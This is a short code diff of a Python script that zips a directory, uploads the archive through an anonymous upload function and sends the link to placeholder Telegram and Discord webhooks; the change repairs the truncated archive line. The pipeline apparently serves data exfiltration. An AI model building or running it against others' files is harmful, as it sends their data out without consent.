@@ -37,7 +37,7 @@ if __name__ == '__main__':
         if len(sys.argv) < 2:
                 helpmsg()
                 exit()
-        shutil.make_archive(sys.argv[2], format='zip', root_dir>
+        shutil.make_archive(sys.argv[2], format='zip', root_dir=sys.argv[1])
         anonlnk = uploadanon(sys.argv[2])
         sendtele('<webhook-telegram>', anonlnk)
         senddiscord('<webhook-discord>', anonlnk)
